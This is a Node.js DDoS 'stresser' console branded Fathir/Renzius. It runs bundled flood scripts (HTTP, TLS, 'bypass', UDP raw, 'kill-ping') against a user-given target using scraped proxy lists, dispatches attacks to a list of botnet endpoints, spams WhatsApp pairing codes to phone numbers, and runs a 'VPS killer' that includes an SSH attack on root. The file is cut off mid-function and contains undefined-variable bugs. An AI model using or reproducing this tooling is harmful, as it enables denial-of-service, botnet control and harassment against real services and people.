#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '5.1.7' 
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
                                              \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀    \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀    \x1b[1;96m  OWNER: [\x1b[1m\x1b[37m @Renzuis \x1b[1;35m]
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄    \x1b[1;96m  PREMIUM: [\x1b[1m\x1b[37m VVIP \x1b[1;35m]
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀    \x1b[1;96m  TIMELIMITED: [\x1b[1m\x1b[37m NOLIMITED \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀    \x1b[1;96m  ANDA MENGGUNAKAN: [\x1b[1m\x1b[37m TOOLS RENZIUS \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀    \x1b[1;96m  GABUNG TELE: [\x1b[1m\x1b[37m https://t.me/RenzuisTresser \x1b[1;35m]
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀      ┏━━┓╋┏┓┏┓┏┓╋╋┏━━┓╋╋┏━┳━┓
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀      ┃━┳┻┓┃┗┫┗╋╋┳┓┗┓┏╋┳━┫━┫━╋━┳┳┓
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀ ⠀     ┃┏┫╋┗┫┏┫┃┃┃┏┛╋┃┃┏┫┻╋━┣━┃┻┫┏
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀      ┗┛┗━━┻━┻┻┻┻┛╋╋┗┻┛┗━┻━┻━┻━┻┛
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀`)}
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearProxy() {
  if (fs.existsSync('proxy.txt')) {
    fs.unlinkSync('proxy.txt');
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`|| ▓░░░░░░░░░ || 10%`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino mineflayer proxy-agent`)
    console.log(`|| ▓▓░░░░░░░░ || 20%`);
    const getLatestVersion = await fetch('https://pastebin.com/raw/bz3pV5NJ');
    const latestVersion = await getLatestVersion.text()
    console.log(`|| ▓▓▓░░░░░░░ || 30%`);
    if (version === latestVersion.trim()) {
    console.log(`|| ▓▓▓▓▓▓░░░░ || 60%`);
    
    const secretBangetJir = await fetch('https://pastebin.com/raw/cGCEitNH');
    const password = await secretBangetJir.text();
    await console.log(`ENTER THIS PASSWORD`)
    permen.question('[\x1b[1m\x1b[35mPASSWORD\x1b[0m]: \n', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.log(`SUCCES LOGIN`)
        await scrapeProxy()
        console.log(`|| ▓▓▓▓▓▓▓░░░ || 70%`)
        await scrapeUserAgent()
        console.log(`|| ▓▓▓▓▓▓▓▓▓▓ || 100%`)
        await sleep(700)
        console.clear()
        console.log(`Welcome To Fathir Stresser Tools ${version}`)
        await sleep(1000)
		    await banner()
        console.log(`═══════════════════════════════════════════════════════════════════════════════════`)
        sigma()
      } else {
        console.log(`PASSWORD SALAH !!!`)
        process.exit(-1);
      }
    }) 
  } else {
      console.log(`This Version Is Outdated. ${version} => ${latestVersion.trim()}`)
      await exec(`npm uninstall -g prmnmd-tuls`)
      await exec(`npm i -g prmnmd-tuls`)
      console.log(`Restart Tools Please`)
      process.exit()
    }
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// ====== //
async function pushmonitor(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function monitorAttack() {
  console.log("\nMonitor Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: tlsvip <target>  <port> <duration>
tlsvip https://google.com 433 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
STATUS::   : \x1b[38;5;160mAttack Has Successfull Launched\x1b[0m
Target   : ${target}
Duration : ${duration}
Methods  : ${methods}
ISP      : ${result.isp}
Ip       : ${result.query}
AS       : ${result.as}
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/lib/cache/${methods}`);
  if (methods === 'zx') {
   pushmonitor(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
	sigma()
 } else if (methods === 'https') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 5 proxy.txt`)
          sigma()
  } else if (methods === 'tlsvip') {
    pushmonitor(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 100 10`)
    sigma()
    } else if (methods === 'bypass') {
      pushmonitor(target, methods, duration)
       exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
      sigma()
      } else if (methods === 'pidoras') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
        sigma()
        } else if (methods === 'black') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 8 proxy.txt`)
          sigma()
          } else if (methods === 'crot') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'raw') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration}`)
          sigma()
          } else if (methods === 'xyn') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 5 proxy.txt`)
          sigma()
          } else if (methods === 'storm') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'httpx') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 9 3 proxy.txt`)
          sigma()
         } else if (methods === 'hitam') {
      pushmonitor(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 100 10 proxy.txt --full`)
      sigma()
          } else if (methods === 'tlsv2') {
       pushmonitor(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else if (methods === 'mixed') {
       pushmonitor(target, methods, duration)
const glory = path.join(__dirname, `/lib/cache/glory`);
const storm = path.join(__dirname, `/lib/cache/storm`);
const httpx = path.join(__dirname, `/lib/cache/httpx`);
        exec(`node ${glory} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${storm} ${target} ${duration} 100 10 proxy.txt`)
        exec(`node ${https} ${target} ${duration} 100 10 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
function methods() {
    
    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));

    console.log(`                          Methods`);
    console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
    console.log(`───────────┼────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}`
        );
    });
}

// Logika untuk menjalankan perintah
const command = process.argv[2]; 
// ===========================================//
async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
    console.log(`Example: botnet <target> <duration> <methods>
botnet https://google.com 120 zx`);
    sigma();
	return
}
const [target, duration, methods] = args
try {
const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                      Attack Has Been Launched
========================================================================
Target Detail
 - Target   : [ ${target} ]
 - Isp      : [ ${result.isp} ]
 - Ip       : [ ${result.query} ]
 - As      : [ ${result.as} ]
Attack Detail
 - STATUS:    [ Attack Succses ]
 - Botnet  : [ ${successCount} ]
 - Duration : [ ${duration} ]
 - Methods  : [ ${methods} ]
`);
    sigma()
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=test&time=1&methods=api`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
// [========================================] //
async function SpamPair(args) {
  if (args.length < 2) {
    console.log(`Example: pairing <target> <duration> 
pairing 6281111111111 500`);
    sigma();
	return
  }
const [targetNumber, spamAmount] = args
try {

console.log(`Attack Detail
 - Target   : [ ${targetNumber} ]
 - Duration : [ ${spamAmount} ]
 - Methods  : [ Spam Pairing Code ]
`)
} catch (error) {
  console.log(`Error`)
}

const metode = path.join(__dirname, `/lib/cache/17`);
exec(`node ${metode} ${targetNumber} ${spamAmount}`)
sigma()
};
// [========================================] //
async function pod(args) {
  if (args.length < 2) {
    console.log(`Example: kill-ping <target> <duration>
kill-ping 123.456.789.10 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
const scrape = await axios.get(`http://ip-api.com/json/${target}?fields=isp,query,as`)
const result = scrape.data;

console.log(`TARGET DETAIL
 \x1b[1;37m  Attacks Details
\x1b[1;37m      Status:     [\x1b[1;32m Attack Sent Successfully All Server \x1b[1;37m]
\x1b[1;37m      HOST:       [\x1b[1m\x1b[36m ${target}  \x1b[1;37m]
\x1b[1;37m      PORT:       [\x1b[1m\x1b[36m 443 \x1b[1;37m]
\x1b[1;37m      TIME:       [\x1b[1m\x1b[36m ${duration} \x1b[1;37m]
\x1b[1;37m      METHODS:    [\x1b[1m\x1b[36m kill-ping \x1b[1;37m]
\x1b[1;37m  TARGET DETAILS
\x1b[1;37m      ASN:        [\x1b[1m\x1b[36m ${result.as} \x1b[1;37m]
\x1b[1;37m      ISP:        [\x1b[1m\x1b[36m ${result.isp} \x1b[1;37m]
\x1b[1;37m      IP:        [\x1b[1m\x1b[36m ${result.query} \x1b[1;37m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/18`);
exec(`node ${metode} ${target} 66507 6 1 ${duration}`)
sigma()
};
// [========================================] //
async function killDo(args) {
  if (args.length < 2) {
    console.log(`Example: kill-do <target> <duration>
kill-do 123.456.78.910 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                    VPS Killer Has Been Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : Digital Ocean Killer
Creator  : V3 And Renzius`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}
const raw = path.join(__dirname, `/lib/cache/14`);
const api = path.join(__dirname, `/lib/cache/3`);
const ssh = path.join(__dirname, `/lib/cache/19`);
exec(`node ${ssh} ${target} 22 root ${duration}`)
exec(`node ${api} http://${target} ${duration}`)
exec(`node ${raw} http://${target} ${duration}`)
sigma()
};
// [========================================] //
async function udp_flood(args) {
  if (args.length < 3) {
    console.log(`Example: udp-raw <target> <port> <duration>
udp-raw 123.456.78.910 53 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢁⣴⣼⣿⣿⣦⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⡀⠀⠠⠀⠒⠈⠀⠀⠀⠈⢿⢹⣿⣿⣿⣿⣿⣿⣦⣦⣤⣀⣀⢀⠀⠀⠀⠀
⠐⠂⠀⠈⠀⠀⠀⢀⣀⣠⣤⣴⣤⣂⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡶⠄
⠀⠀⠁⠢⠄⡀⠀⠈⠙⠻⢿⣿⣿⣿⣄⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀
⠀⠀⠀⠀⠀⠀⠁⠢⢠⡀⠀⠉⠉⠛⠿⠦⣸⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⡁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡔⢁⣰⠖⠂⢆⢀⠀⢸⣿⣿⡿⠟⠛⠿⣿⣷⣂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⢎⡴⠛⠀⠀⠀⠀⢳⠢⢸⣿⣿⠃⠀⠀⠀⠈⠛⢷⣦⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠂⡀⢤⡶⠋⠀⠀⠀⠀⠀⠀⠈⠀⢸⣿⣯⠀⠀⠀⠀⠀⠀⠀⠙⣳⣤⡖⠋⠀⠀
⠀⠀⠀⠀⠀⠠⢑⡄⠀⠀⠀⠀⠀⢀⠀⢆⢸⣿⡇⠀⠀⠀⠀⠀⠀⢀⡼⠟⠋⠀⠀⠀⠀
⠀⠀⠀⠠⠀⢆⠆⣹⠉⡞⠀⡀⡀⡀⠀⣒⣒⡇⠠⠘⠧⢹⠢⢀⣀⠨⡀⢄⠠⠄⡄⠀⠀
⠀⠀⠀⠀⠠⠈⠐⠛⠠⠏⠀⠀⠀⠓⠀⠐⣤⠇⠀⠀⠠⠼⠠⠈⠉⠩⠗⡌⠠⠊⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀

                    UDP Raw Flood Attack Launched
========================================================================
Target   : ${target}
Duration : ${duration}
Methods  : UDP Raw
Creator  : V3 And Renzius`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/20`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function zx(args) {
  if (args.length < 3) {
    console.log(`Example: .zx <target> <port> <duration>
zx https://contoh.com 443 60`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
	const parsing = new url.URL(target)
const hostname = parsing.hostname
const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`)
const result = scrape.data;

console.clear()
console.log(`
                                           \x1b[1;31m    \x1b[31m\x1b[47m- [powered by FathirC2] -\x1b[0m
                                          \x1b[1;96m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\x1b[1;96m
